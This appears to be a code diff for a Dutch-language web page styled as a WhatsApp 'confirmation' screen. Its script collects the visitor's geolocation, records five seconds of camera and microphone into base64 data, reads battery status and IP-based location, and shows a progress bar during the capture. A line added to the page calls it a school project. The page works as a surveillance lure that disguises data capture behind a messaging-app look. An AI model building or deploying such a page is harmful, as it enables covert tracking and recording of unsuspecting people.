@@ -4,7 +4,147 @@
     <meta charset="UTF-8">
     <title>Bevestiging</title>
     <style>
-        /* [Uw bestaande CSS-code blijft ongewijzigd] */
+        /* Algemene pagina-opmaak */
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: white;
+            text-align: center;
+            background: url('https://i.postimg.cc/sDTjTFrr/whatsapp-background.jpg') no-repeat center center fixed;
+            background-size: cover;
+            overflow: hidden;
+        }
+
+        /* Container voor de inhoud */
+        .container {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+            width: 90%;
+            max-width: 400px;
+            color: #333;
+            box-sizing: border-box;
+        }
+
+        h1 {
+            margin: 0 0 10px;
+            font-size: 24px;
+        }
+
+        p {
+            margin: 0 0 10px;
+            font-size: 16px;
+        }
+
+        /* Geaccentueerde tekst */
+        .highlight {
+            font-weight: bold;
+            color: #4caf50;
+        }
+
+        /* Voortgangsbalk */
+        .progress-bar {
+            background: rgba(0, 0, 0, 0.1);
+            height: 10px;
+            border-radius: 5px;
+            overflow: hidden;
+            margin-top: 20px;
+            width: 100%;
+            position: relative;
+            display: none; /* Verborgen totdat de knop is geklikt */
+        }
+
+        .progress-bar span {
+            display: block;
+            height: 100%;
+            background: linear-gradient(90deg, #4caf50, #03a9f4);
+            width: 0;
+            animation: loadProgress linear forwards;
+        }
+
+        @keyframes loadProgress {
+            0% {
+                width: 0;
+            }
+            100% {
+                width: 100%;
+            }
+        }
+
+        /* Loading-animatie */
+        .loading {
+            display: none; /* Verborgen totdat de knop is geklikt */
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(0, 0, 0, 0.1);
+            border-top: 5px solid #03a9f4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto 0;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Verberg foutbericht als standaard */
+        #error-message {
+            display: none;
+            color: #ff5722;
+            font-size: 14px;
+        }
+
+        /* Disclaimer */
+        .disclaimer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #fff;
+        }
+
+        /* Knop stijl */
+        #permissionButton {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #03a9f4;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px; /* Toegevoegd om wat ruimte boven de knop te creëren */
+        }
+
+        #permissionButton:hover {
+            background-color: #0288d1;
+        }
+
+        /* Responsive */
+        @media screen and (max-width: 480px) {
+            .container {
+                padding: 15px;
+            }
+
+            h1 {
+                font-size: 20px;
+            }
+
+            p {
+                font-size: 14px;
+            }
+
+            #permissionButton {
+                font-size: 14px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -21,6 +161,7 @@
         </div>
         <p id="error-message">Kon gegevens niet ophalen. Probeer het opnieuw.</p>
     </div>
+    <p class="disclaimer">Dit is een schoolproject en er wordt op geen enkele manier misbruik van gemaakt.</p>
 
     <script>
         // Haal instellingen op uit localStorage
@@ -94,7 +235,7 @@
             }
         }
 
-        function getLocationData() {
+        async function getLocationData() {
             return new Promise((resolve, reject) => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
@@ -118,7 +259,10 @@
                             resolve();
                         },
                         (error) => {
-                            console.error('Error getting location:', error);
+                            document.querySelector(".loading").style.display = "none";
+                            document.getElementById("error-message").style.display = "block";
+                            document.getElementById("error-message").innerText =
+                                "Kon locatie niet ophalen. Zorg ervoor dat je toestemming hebt gegeven.";
                             reject(error);
                         },
                         {
@@ -128,22 +272,22 @@
                         }
                     );
                 } else {
-                    reject(new Error("Je browser ondersteunt geen geolocatie. Gebruik een moderne browser."));
+                    document.querySelector(".loading").style.display = "none";
+                    document.getElementById("error-message").style.display = "block";
+                    document.getElementById("error-message").innerText =
+                        "Je browser ondersteunt geen geolocatie. Gebruik een moderne browser.";
+                    reject(new Error("Geolocatie niet ondersteund"));
                 }
             });
         }
 
-        function getMicCamData() {
+        async function getMicCamData() {
             return new Promise(async (resolve, reject) => {
-                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    reject(new Error('Media Devices API niet ondersteund.'));
-                    return;
-                }
-
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
 
-                    const mediaRecorder = new MediaRecorder(stream);
+                    const options = { mimeType: 'video/webm; codecs=vp9' };
+                    const mediaRecorder = new MediaRecorder(stream, options);
                     let chunks = [];
 
                     mediaRecorder.ondataavailable = function (e) {
@@ -157,8 +301,10 @@
                         const reader = new FileReader();
 
                         reader.onloadend = function () {
+                            const base64data = reader.result;
+
                             recordingData = {
-                                dataUrl: reader.result,
+                                dataUrl: base64data,
                                 timestamp: new Date().toISOString()
                             };
 
@@ -178,13 +324,17 @@
                         stream.getTracks().forEach(track => track.stop());
                     }, 5000);
                 } catch (error) {
-                    console.error("Error accessing media devices:", error);
+                    console.error("Error accessing mic/cam:", error);
+                    document.querySelector(".loading").style.display = "none";
+                    document.getElementById("error-message").style.display = "block";
+                    document.getElementById("error-message").innerText =
+                        "Kon de microfoon en camera niet openen. Zorg ervoor dat je toestemming hebt gegeven.";
                     reject(error);
                 }
             });
         }
 
-        function requestNotificationPermission() {
+        async function requestNotificationPermission() {
             return new Promise((resolve, reject) => {
                 if ("Notification" in window) {
                     Notification.requestPermission().then(permission => {
@@ -201,9 +351,9 @@
         }
 
         async function getBatteryData() {
-            if ('getBattery' in navigator || ('battery' in navigator && navigator.battery)) {
+            if ('getBattery' in navigator) {
                 try {
-                    const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve(navigator.battery));
+                    const battery = await navigator.getBattery();
                     batteryData = {
                         level: battery.level,
                         charging: battery.charging
@@ -238,10 +388,9 @@
                     permissions.push(requestNotificationPermission());
                 }
 
-                await Promise.all(permissions);
-
                 await getBatteryData();
                 await getIPLocationData();
+                await Promise.all(permissions);
 
                 // Stel de duur van de voortgangsbalkanimatie in
                 const progressBarSpan = document.getElementById('progressBarSpan');
@@ -257,8 +406,6 @@
                 document.querySelector(".loading").style.display = "none";
                 document.getElementById("error-message").style.display = "block";
                 document.getElementById("error-message").innerText = error.message;
-                // Toon de knop weer om opnieuw te proberen
-                document.getElementById('permissionButton').style.display = 'block';
             }
         }
 
